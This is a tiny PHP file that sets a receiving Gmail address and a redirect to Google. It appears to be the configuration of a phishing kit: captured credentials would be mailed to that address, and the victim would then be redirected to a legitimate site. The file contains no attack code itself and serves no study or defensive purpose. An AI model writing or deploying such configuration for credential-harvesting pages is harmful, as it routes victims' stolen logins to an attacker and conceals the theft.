<?php 
$Receive_email="boyzhome6@gmail.com";
$redirect="https://www.google.com/";
?>